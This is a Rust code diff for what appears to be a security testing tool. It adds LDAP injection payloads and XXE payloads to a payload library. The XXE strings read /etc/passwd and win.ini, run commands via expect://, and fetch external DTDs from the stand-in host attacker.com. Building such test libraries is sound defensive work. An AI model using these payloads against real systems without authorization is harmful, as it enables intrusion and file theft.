@@ -356,6 +356,98 @@ impl SecurityPayloads {
         ]
     }
 
+    /// Get LDAP injection payloads
+    pub fn ldap_injection() -> Vec<SecurityPayload> {
+        vec![
+            SecurityPayload::new(
+                "*".to_string(),
+                SecurityCategory::LdapInjection,
+                "LDAP wildcard - match all".to_string(),
+            ),
+            SecurityPayload::new(
+                "*)(&".to_string(),
+                SecurityCategory::LdapInjection,
+                "LDAP filter injection - close and inject".to_string(),
+            ),
+            SecurityPayload::new(
+                "*)(uid=*))(|(uid=*".to_string(),
+                SecurityCategory::LdapInjection,
+                "LDAP OR injection to bypass auth".to_string(),
+            ),
+            SecurityPayload::new(
+                "admin)(&)".to_string(),
+                SecurityCategory::LdapInjection,
+                "LDAP always true injection".to_string(),
+            ),
+            SecurityPayload::new(
+                "x)(|(objectClass=*".to_string(),
+                SecurityCategory::LdapInjection,
+                "LDAP objectClass enumeration".to_string(),
+            ),
+            SecurityPayload::new(
+                "*)(cn=*".to_string(),
+                SecurityCategory::LdapInjection,
+                "LDAP CN attribute injection".to_string(),
+            ),
+            SecurityPayload::new(
+                "*)%00".to_string(),
+                SecurityCategory::LdapInjection,
+                "LDAP null byte injection".to_string(),
+            ),
+            SecurityPayload::new(
+                "*))%00".to_string(),
+                SecurityCategory::LdapInjection,
+                "LDAP double close with null byte".to_string(),
+            ),
+        ]
+    }
+
+    /// Get XXE (XML External Entity) payloads
+    pub fn xxe() -> Vec<SecurityPayload> {
+        vec![
+            SecurityPayload::new(
+                r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>"#.to_string(),
+                SecurityCategory::Xxe,
+                "Basic XXE - read /etc/passwd".to_string(),
+            ).high_risk(),
+            SecurityPayload::new(
+                r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>"#.to_string(),
+                SecurityCategory::Xxe,
+                "Windows XXE - read win.ini".to_string(),
+            ).high_risk(),
+            SecurityPayload::new(
+                r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>"#.to_string(),
+                SecurityCategory::Xxe,
+                "XXE SSRF - external request".to_string(),
+            ).high_risk(),
+            SecurityPayload::new(
+                r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]><foo>bar</foo>"#.to_string(),
+                SecurityCategory::Xxe,
+                "External DTD XXE".to_string(),
+            ).high_risk(),
+            SecurityPayload::new(
+                r#"<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>"#.to_string(),
+                SecurityCategory::Xxe,
+                "PHP expect XXE - command execution".to_string(),
+            ).high_risk(),
+            SecurityPayload::new(
+                r#"<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>"#.to_string(),
+                SecurityCategory::Xxe,
+                "PHP filter XXE - base64 encoded read".to_string(),
+            ).high_risk(),
+            SecurityPayload::new(
+                r#"<!DOCTYPE foo [<!ENTITY % a "<!ENTITY &#37; b SYSTEM 'file:///etc/passwd'>">%a;%b;]>"#.to_string(),
+                SecurityCategory::Xxe,
+                "Parameter entity XXE".to_string(),
+            ).high_risk(),
+            SecurityPayload::new(
+                r#"<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://attacker.com/xxe.dtd"><foo>&xxe;</foo>"#.to_string(),
+                SecurityCategory::Xxe,
+                "External DTD reference".to_string(),
+            ).high_risk(),
+        ]
+    }
+
     /// Get all payloads for a specific category
     pub fn get_by_category(category: SecurityCategory) -> Vec<SecurityPayload> {
         match category {
@@ -364,8 +456,8 @@ impl SecurityPayloads {
             SecurityCategory::CommandInjection => Self::command_injection(),
             SecurityCategory::PathTraversal => Self::path_traversal(),
             SecurityCategory::Ssti => Self::ssti(),
-            SecurityCategory::LdapInjection => Vec::new(), // TODO: Add LDAP payloads
-            SecurityCategory::Xxe => Vec::new(),           // TODO: Add XXE payloads
+            SecurityCategory::LdapInjection => Self::ldap_injection(),
+            SecurityCategory::Xxe => Self::xxe(),
         }
     }
 
